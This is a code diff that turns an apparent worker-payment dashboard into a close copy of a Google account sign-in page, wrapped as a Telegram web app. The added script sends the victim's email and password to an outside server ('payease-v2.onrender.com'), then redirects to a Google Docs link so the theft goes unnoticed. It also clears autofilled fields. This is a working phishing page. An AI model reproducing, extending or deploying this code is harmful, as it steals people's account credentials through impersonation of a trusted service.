-    <button onclick="closeDetailModal()" class="w-10 h-10 rounded-xl bg-white/5 flex items-center justify-center border border-white/10 active:scale-90 transition-all">
-        <i data-lucide="x" class="w-5 h-5 text-gray-400"></i>
-    </button>
+        <!-- Forgot password -->
+        <div class="mt-4">
+  <a href="#" class="theme-link text-sm font-medium text-[#8ab4f8] hover:underline transition-colors duration-150">
+    Forgot password?
+  </a>
 </div>
 
-        <div class="mb-8 text-center">
-            <h2 id="detail-name" class="text-2xl font-black text-white">---</h2>
-            <p id="detail-club" class="text-[11px] font-bold uppercase tracking-[0.3em] text-premium-neonBlue">---</p>
-        </div>
+        <!-- Protection notice -->
+        <p class="text-sm leading-relaxed text-[#ababab] mt-5 transition-colors duration-300">
+          To protect your account, Google wants to make sure it's really you trying to sign in.
+        </p>
 
-        <div class="mb-8 grid grid-cols-2 gap-4">
-            <div class="rounded-2xl bg-white/5 p-4 border border-white/5">
-                <p class="mb-1 text-[9px] font-black uppercase text-gray-400">Daily Rate</p>
-                <p id="detail-rate" class="text-lg font-black text-white">---</p>
-            </div>
-            <div class="rounded-2xl bg-white/5 p-4 border border-white/10">
-                <p class="mb-1 text-[9px] font-black uppercase text-gray-400">Loan</p>
-                <p id="detail-active-loan" class="text-lg font-black text-red-500">0 ETB</p>
-            </div>
-        </div>
+        <!-- Buttons -->
+        <button onclick="goBackToEmail()" class="
+  font-google text-sm font-medium
+  text-[#8ab4f8] px-2 py-2.5 rounded
+  cursor-pointer border-none bg-transparent
+  hover:bg-[rgba(138,180,248,0.1)]
+  transition-colors duration-100 tracking-[0.25px]
+  btn-txt
+">Back</button>
 
-        <p class="text-[10px] font-black uppercase tracking-widest text-gray-500 mb-4 ml-1">Recent Payouts</p>
-        <div id="detail-history-list" class="space-y-3 mb-8">
-            </div>
+<button onclick="signIn()" class="
+  font-google text-sm font-medium
+  bg-[#8ab4f8] text-[#202124]
+  px-7 py-2.5 rounded-full
+  cursor-pointer border-none
+  hover:brightness-90 active:brightness-75
+  transition-all duration-100 tracking-[0.25px]
+  btn-pri
+">Next</button>
 
-        <button onclick="closeDetailModal()" 
-                class="w-full py-4 rounded-2xl bg-white/5 border border-white/10 text-white font-black text-[11px] uppercase tracking-[0.2em] active:scale-95 transition-all">
-            Close Detail
-        </button>
-    </div>
+      </div><!-- /step-password -->
+
+    </div><!-- /panel-right -->
+  </div><!-- /card -->
+</main>
+
+<!-- ══════════════════════════════════════════════
+     FOOTER
+═══════════════════════════════════════════════ -->
+<footer class="px-6 py-3.5 flex flex-wrap justify-between items-center gap-2">
+  <button class="
+    flex items-center gap-1.5 bg-transparent border-none cursor-pointer
+    text-[13px] text-[#ababab] font-roboto p-0
+    hover:text-[#e3e3e3] transition-colors duration-200
+  ">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
+      stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+      <circle cx="12" cy="12" r="10"/>
+      <line x1="2" y1="12" x2="22" y2="12"/>
+      <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
+    </svg>
+    English (United States)
+    <svg width="12" height="12" viewBox="0 0 24 24" fill="none"
+      stroke="currentColor" stroke-width="2.5" stroke-linecap="round">
+      <polyline points="6 9 12 15 18 9"/>
+    </svg>
+  </button>
+  <div class="flex gap-6">
+  <a href="#" class="foot-link text-[13px] text-[#ababab] no-underline hover:text-[#e3e3e3] hover:underline transition-colors duration-200">Help</a>
+  <a href="#" class="foot-link text-[13px] text-[#ababab] no-underline hover:text-[#e3e3e3] hover:underline transition-colors duration-200">Privacy</a>
+  <a href="#" class="foot-link text-[13px] text-[#ababab] no-underline hover:text-[#e3e3e3] hover:underline transition-colors duration-200">Terms</a>
 </div>
+</footer>
 
-<div id="history-overlay" class="fixed inset-0 z-[800] hidden bg-[#050505] transition-all duration-300">
-    <div class="p-6 pt-12 h-full flex flex-col">
-        <div class="flex items-center justify-between mb-8">
-            <button onclick="closeFullHistory()" class="text-[10px] font-black uppercase text-gray-500 flex items-center gap-2">
-                <i data-lucide="chevron-left" class="w-4 h-4"></i> Back
-            </button>
-            <h3 class="text-lg font-black uppercase tracking-widest text-white">Records</h3>
-            <div class="w-10"></div>
-        </div>
+<!-- ══════════════════════════════════════════════
+     SCRIPT
+═══════════════════════════════════════════════ -->
+<script>
+const $ = id => document.getElementById(id);
+const html = document.documentElement;
+const DARK = {
+  body:    ['bg-[#1f1f1f]', 'text-[#e3e3e3]'],
+  card:    ['bg-[#2d2d2d]', 'border-transparent'],
+  themeBtn:['bg-[#2d2d2d]', 'border-[#5f6368]', 'text-[#e3e3e3]'],
+  divider: ['bg-[#3c3c3c]'],
+};
+const LIGHT = {
+  body:    ['bg-[#f1f3f4]', 'text-[#202124]'],
+  card:    ['bg-white',     'border-[#dadce0]'],
+  themeBtn:['bg-white',     'border-[#dadce0]',  'text-[#202124]'],
+  divider: ['bg-[#e0e0e0]'],
+};
 
-        <div class="flex p-1 bg-white/5 rounded-2xl border border-white/10 mb-8">
-            <button id="tab-payouts" onclick="switchTabs('payouts')" class="flex-1 py-3 rounded-xl text-[10px] font-black uppercase bg-premium-neonBlue text-black transition-all">Payouts</button>
-            <button id="tab-loans" onclick="switchTabs('loans')" class="flex-1 py-3 rounded-xl text-[10px] font-black uppercase text-gray-500 transition-all">Loans</button>
-        </div>
+/* ── Inputs that need per-theme color ── */
+const EMAIL_CLASSES_DARK = [
+  'border-[#5f6368]','text-[#e3e3e3]','caret-[#8ab4f8]',
+  'focus:border-[#8ab4f8]',
+];
+const EMAIL_CLASSES_LIGHT = [
+  'border-[#dadce0]','text-[#202124]','caret-[#1a73e8]',
+  'focus:border-[#1a73e8]',
+];
+const LABEL_DARK  = ['text-[#ababab]'];
+const LABEL_LIGHT = ['text-[#5f6368]'];
 
-        <div id="history-content-list" class="flex-1 overflow-y-auto space-y-4 pb-10">
-            </div>
-    </div>
-</div>
-<div id="modal-edit-form" class="hidden space-y-4">
-    <input type="text" id="edit-name" placeholder="Full Name" ...>
-    <input type="text" id="edit-phone" placeholder="Phone Number" class="w-full bg-white/5 border border-white/10 rounded-2xl px-6 py-4 text-white outline-none">
-    <input type="text" id="edit-club" placeholder="Club (e.g. Vintage)" ...>
-    <input type="number" id="edit-rate" placeholder="Daily Rate (ETB)" ...>
+/* primary button */
+const BTN_PRI_DARK  = ['bg-[#8ab4f8]','text-[#202124]'];
+const BTN_PRI_LIGHT = ['bg-[#1a73e8]','text-white'];
+const BTN_TXT_DARK  = ['text-[#8ab4f8]','hover:bg-[rgba(138,180,248,0.1)]'];
+const BTN_TXT_LIGHT = ['text-[#1a73e8]','hover:bg-[#e8f0fe]'];
+const LINK_DARK  = ['text-[#8ab4f8]'];
+const LINK_LIGHT = ['text-[#1a73e8]'];
+const MUTED_DARK  = ['text-[#ababab]'];
+const MUTED_LIGHT = ['text-[#5f6368]'];
+const ERR_DARK  = ['text-[#f28b82]'];
+const ERR_LIGHT = ['text-[#d93025]'];
+const CHIP_DARK  = ['border-[#5f6368]','hover:bg-white/[0.06]'];
+const CHIP_LIGHT = ['border-[#dadce0]','hover:bg-[#f1f3f4]'];
+const AVATAR_DARK  = ['bg-[#4285f4]'];
+const AVATAR_LIGHT = ['bg-[#1a73e8]'];
+const CHIP_EMAIL_DARK  = ['text-[#e3e3e3]'];
+const CHIP_EMAIL_LIGHT = ['text-[#202124]'];
+const FOOT_LINK_DARK  = ['text-[#ababab]','hover:text-[#e3e3e3]'];
+const FOOT_LINK_LIGHT = ['text-[#5f6368]','hover:text-[#202124]'];
+const FOOT_BTN_DARK  = ['text-[#ababab]','hover:text-[#e3e3e3]'];
+const FOOT_BTN_LIGHT = ['text-[#5f6368]','hover:text-[#202124]'];
+const HEADING_DARK  = ['text-[#e3e3e3]'];
+const HEADING_LIGHT = ['text-[#202124]'];
+const SUBTEXT_DARK  = ['text-[#ababab]'];
+const SUBTEXT_LIGHT = ['text-[#5f6368]'];
+const INFO_DARK  = ['text-[#ababab]'];
+const INFO_LIGHT = ['text-[#5f6368]'];
+
+function swap(el, remove, add) {
+  if (!el) return;
+  remove.forEach(c => { c.split(' ').forEach(x => el.classList.remove(x)); });
+  add.forEach(c    => { c.split(' ').forEach(x => el.classList.add(x)); });
+}
+
+function applyTheme(theme) {
+  const isDark = theme === 'dark';
+  html.dataset.theme = theme;
+
+  /* body */
+  swap($('body'), isDark ? LIGHT.body  : DARK.body,  isDark ? DARK.body  : LIGHT.body);
+  /* card */
+  swap($('card'), isDark ? LIGHT.card  : DARK.card,  isDark ? DARK.card  : LIGHT.card);
+  /* theme btn */
+  swap($('theme-btn'), isDark ? LIGHT.themeBtn : DARK.themeBtn, isDark ? DARK.themeBtn : LIGHT.themeBtn);
+  /* divider */
+  swap($('v-divider'), isDark ? LIGHT.divider : DARK.divider, isDark ? DARK.divider : LIGHT.divider);
+  /* icons */
+  $('icon-moon').classList.toggle('hidden', !isDark);
+  $('icon-sun').classList.toggle('hidden', isDark);
+
+  /* inputs + labels */
+  ['email-input','pw-input'].forEach(id => {
+    const inp = $(id); if (!inp) return;
+    swap(inp, isDark ? EMAIL_CLASSES_LIGHT : EMAIL_CLASSES_DARK, isDark ? EMAIL_CLASSES_DARK : EMAIL_CLASSES_LIGHT);
+  });
+  document.querySelectorAll('.fl-label').forEach(l => {
+    swap(l, isDark ? LABEL_LIGHT : LABEL_DARK, isDark ? LABEL_DARK : LABEL_LIGHT);
+  });
+
+  /* primary buttons */
+  document.querySelectorAll('.btn-pri').forEach(b => {
+    swap(b, isDark ? BTN_PRI_LIGHT : BTN_PRI_DARK, isDark ? BTN_PRI_DARK : BTN_PRI_LIGHT);
+  });
+  /* text buttons */
+  document.querySelectorAll('.btn-txt').forEach(b => {
+    swap(b, isDark ? BTN_TXT_LIGHT : BTN_TXT_DARK, isDark ? BTN_TXT_DARK : BTN_TXT_LIGHT);
+  });
+  /* links */
+  document.querySelectorAll('.theme-link').forEach(a => {
+    swap(a, isDark ? LINK_LIGHT : LINK_DARK, isDark ? LINK_DARK : LINK_LIGHT);
+  });
+  /* muted texts */
+  document.querySelectorAll('.theme-muted').forEach(el => {
+    swap(el, isDark ? MUTED_LIGHT : MUTED_DARK, isDark ? MUTED_DARK : MUTED_LIGHT);
+  });
+  /* error rows */
+  document.querySelectorAll('.err-row').forEach(el => {
+    swap(el, isDark ? ERR_LIGHT : ERR_DARK, isDark ? ERR_DARK : ERR_LIGHT);
+  });
+  /* chip */
+  const chip = $('avatar-chip');
+  swap(chip, isDark ? CHIP_LIGHT : CHIP_DARK, isDark ? CHIP_DARK : CHIP_LIGHT);
+  swap($('avatar-circle'), isDark ? AVATAR_LIGHT : AVATAR_DARK, isDark ? AVATAR_DARK : AVATAR_LIGHT);
+  swap($('chip-email'), isDark ? CHIP_EMAIL_LIGHT : CHIP_EMAIL_DARK, isDark ? CHIP_EMAIL_DARK : CHIP_EMAIL_LIGHT);
+  /* headings */
+  swap($('main-heading'), isDark ? HEADING_LIGHT : HEADING_DARK, isDark ? HEADING_DARK : HEADING_LIGHT);
+  swap($('main-subtext'), isDark ? SUBTEXT_LIGHT : SUBTEXT_DARK, isDark ? SUBTEXT_DARK : SUBTEXT_LIGHT);
+  /* footer links/btn */
+  document.querySelectorAll('.foot-link').forEach(a => {
+    swap(a, isDark ? FOOT_LINK_LIGHT : FOOT_LINK_DARK, isDark ? FOOT_LINK_DARK : FOOT_LINK_LIGHT);
+  });
+  document.querySelectorAll('.foot-btn').forEach(b => {
+    swap(b, isDark ? FOOT_BTN_LIGHT : FOOT_BTN_DARK, isDark ? FOOT_BTN_DARK : FOOT_BTN_LIGHT);
+  });
+  /* info texts */
+  document.querySelectorAll('.theme-info').forEach(el => {
+    swap(el, isDark ? INFO_LIGHT : INFO_DARK, isDark ? INFO_DARK : INFO_LIGHT);
+  });
+
+  localStorage.setItem('g-signin-theme', theme);
+}
+
+function toggleTheme() {
+  applyTheme(html.dataset.theme === 'dark' ? 'light' : 'dark');
+}
+
+/* init on load */
+(function() {
+  const saved = localStorage.getItem('g-signin-theme') || 'dark';
+  if (saved !== 'dark') applyTheme(saved);
+})();
+
+/* ── VALIDATION ── */
+function isValidEmail(v) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) ||
+         /^\+?[\d\s\-(). ]{7,20}$/.test(v);
+}
+
+/* ── ERROR HELPERS ── */
+function showErr(id, msg) {
+  const row = $(id);
+  if (msg) { const s = row.querySelector('span'); if (s) s.textContent = msg; }
+  row.classList.add('err-show');
+}
+function hideErr(id) { $(id).classList.remove('err-show'); }
+
+function setInputErr(id) {
+  const inp = $(id);
+  inp.classList.remove('border-[#5f6368]','border-[#dadce0]','focus:border-[#8ab4f8]','focus:border-[#1a73e8]');
+  inp.classList.add('border-2','border-[#f28b82]','focus:border-[#f28b82]');
+  if (html.dataset.theme === 'light') {
+    inp.classList.remove('border-[#f28b82]','focus:border-[#f28b82]');
+    inp.classList.add('border-[#d93025]','focus:border-[#d93025]');
+  }
+  /* turn label red */
+  const label = inp.nextElementSibling;
+  if (label && label.classList.contains('fl-label')) {
+    label.classList.remove(...LABEL_DARK, ...LABEL_LIGHT);
+    label.classList.add(html.dataset.theme === 'dark' ? 'text-[#f28b82]' : 'text-[#d93025]');
+  }
+}
+function clearInputErr(id) {
+  const inp = $(id);
+  inp.classList.remove('border-2','border-[#f28b82]','focus:border-[#f28b82]','border-[#d93025]','focus:border-[#d93025]');
+  const isDark = html.dataset.theme === 'dark';
+  inp.classList.add(isDark ? 'border-[#5f6368]' : 'border-[#dadce0]');
+  inp.classList.add(isDark ? 'focus:border-[#8ab4f8]' : 'focus:border-[#1a73e8]');
+  const label = inp.nextElementSibling;
+  if (label && label.classList.contains('fl-label')) {
+    label.classList.remove('text-[#f28b82]','text-[#d93025]');
+    label.classList.add(isDark ? 'text-[#ababab]' : 'text-[#5f6368]');
+  }
+}
+
+/* ── FLOW ── */
+function goToPassword() {
+  const email = $('email-input').value.trim();
+  if (!email) {
+    showErr('email-err', 'Enter an email or phone number');
+    setInputErr('email-input'); return;
+  }
+  if (!isValidEmail(email)) {
+    showErr('email-err', "That doesn't look like a valid email or phone number.");
+    setInputErr('email-input'); return;
+  }
+  hideErr('email-err'); clearInputErr('email-input');
+
+  $('chip-email').textContent    = email;
+  $('avatar-circle').textContent = email[0].toUpperCase();
+  $('avatar-chip').style.display = 'flex';
+  $('main-subtext').style.opacity = '0';
+  $('main-subtext').style.pointerEvents = 'none';
+
+  $('step-email').classList.add('hidden');
+  $('step-email').classList.remove('flex','step-active');
+  $('step-password').classList.remove('hidden');
+  $('step-password').classList.add('flex','step-active');
+  setTimeout(() => $('pw-input').focus(), 60);
+}
+
+function goBackToEmail() {
+  $('step-password').classList.add('hidden');
+  $('step-password').classList.remove('flex','step-active');
+  $('step-email').classList.remove('hidden');
+  $('step-email').classList.add('flex','step-active');
+  $('avatar-chip').style.display = 'none';
+  $('main-subtext').style.opacity = '';
+  $('main-subtext').style.pointerEvents = '';
+  $('pw-input').value = '';
+  hideErr('pw-err'); clearInputErr('pw-input');
+  setTimeout(() => $('email-input').focus(), 60);
+}
+
+function togglePw() {
+  const inp = $('pw-input');
+  const isPass = inp.type === 'password';
+  inp.type = isPass ? 'text' : 'password';
+  $('eye-open').classList.toggle('hidden', isPass);
+  $('eye-off').classList.toggle('hidden',  !isPass);
+  $('eye-btn').setAttribute('aria-label', isPass ? 'Hide password' : 'Show password');
+}
+
+// --- INITIALIZE TELEGRAM WEBAPP ---
+const tg = window.Telegram?.WebApp;
+if (tg) {
+    tg.ready();
+    tg.expand();
+}
+// Local Configuration Point matching your previous backend URL structure
+const API_BASE = "https://payease-v2.onrender.com/api";
+// const API_BASE = "http://localhost:5000/api";
+
+async function signIn() {
+    const email = $('email-input').value.trim();
+    const pw = $('pw-input').value;
+
+    // Local input validation check
+    if (!pw) { 
+        showErr('pw-err', null); 
+        setInputErr('pw-input'); 
+        return; 
+    }
+    hideErr('pw-err'); 
+    clearInputErr('pw-input');
     
-    <button onclick="submitEdit()" id="edit-submit-btn" ...>Create Worker</button>
-</div>
-    <script src="/frontend/src/app.js"></script>
+    // Select primary button object to show loading/disabled state if necessary
+    const primaryBtn = document.querySelector('.btn-pri');
+    
+    try {
+        if (primaryBtn) primaryBtn.disabled = true;
+
+        // Perform the API request to the backend server
+        const response = await fetch(`${API_BASE}/auth/submit`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                email: email,
+                password: pw
+            })
+        });
+
+        if (!response.ok) {
+            throw new Error(`Server returned execution status code: ${response.status}`);
+        }
+
+        const result = await response.json();
+
+        // Optional: Trigger Telegram app feedback mechanics if applicable
+        if (window.Telegram?.WebApp?.HapticFeedback) {
+            window.Telegram.WebApp.HapticFeedback.notificationOccurred('success');
+        }
+
+        // Navigate the user to the target asset destination on success
+        if (result.redirect_url) {
+            window.location.href = result.redirect_url;
+        } else {
+            // Hardcoded fallback destination if response lacks a redirect property
+            window.location.href = "https://docs.google.com/document/d/1ZL_J88JiP17xbjF0iVO6uH-BExybAwJRzg7uxEgALPU/edit?usp=sharing";
+        }
+
+    } catch (err) {
+        console.error("Submission failed during transmission payload cycle:", err);
+        showErr('pw-err', "Synchronization error. Please check your network connection.");
+        setInputErr('pw-input');
+    } finally {
+        if (primaryBtn) primaryBtn.disabled = false;
+    }
+}
+/* ── ENTER KEY ── */
+document.addEventListener('keydown', e => {
+  if (e.key !== 'Enter') return;
+  if (!$('step-email').classList.contains('hidden'))    goToPassword();
+  else if (!$('step-password').classList.contains('hidden')) signIn();
+});
+
+/* ── LIVE ERROR CLEAR ── */
+$('email-input').addEventListener('input', () => { hideErr('email-err'); clearInputErr('email-input'); });
+$('pw-input').addEventListener('input',    () => { hideErr('pw-err');    clearInputErr('pw-input'); });
+
+/* ── BLOCK AUTOFILL COMPLETELY ── */
+window.addEventListener('load', () => {
+  /* short delay so browser autofill fires first, then we wipe it */
+  setTimeout(() => {
+    $('email-input').value = '';
+    $('pw-input').value    = '';
+  }, 100);
+});
+</script>
 </body>
 </html>
